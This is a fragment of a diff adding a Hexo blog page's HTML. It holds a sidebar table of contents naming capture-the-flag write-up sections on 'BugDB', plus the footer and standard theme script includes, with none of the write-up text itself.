href="#BugDB-v1-FLAG0"><span class="nav-number">1.50.</span> <span class="nav-text">BugDB v1 - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Overview-1"><span class="nav-number">1.50.1.</span> <span class="nav-text">0x00 Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-FLAG-3"><span class="nav-number">1.50.2.</span> <span class="nav-text">0x01 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BugDB-v2"><span class="nav-number">1.51.</span> <span class="nav-text">BugDB v2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-14"><span class="nav-number">1.51.1.</span> <span class="nav-text">Flag0 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BugDB-v2-FLAG0"><span class="nav-number">1.52.</span> <span class="nav-text">BugDB v2 - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Overview-2"><span class="nav-number">1.52.1.</span> <span class="nav-text">0x00 Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Take-a-Tour"><span class="nav-number">1.52.2.</span> <span class="nav-text">0x01 Take a Tour</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#allUsers"><span class="nav-number">1.52.2.1.</span> <span class="nav-text">allUsers</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allBugs"><span class="nav-number">1.52.2.2.</span> <span class="nav-text">allBugs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mutation"><span class="nav-number">1.52.2.3.</span> <span class="nav-text">mutation</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-FLAG-7"><span class="nav-number">1.52.3.</span> <span class="nav-text">0x02 FLAG</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fangshengjian</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.3.0</div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+      </div>
+
+    
+
+  </div>
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+<script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+
+  <script src="/js/schemes/muse.js?v=7.3.0"></script>
+
+
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+</body>
+</html>
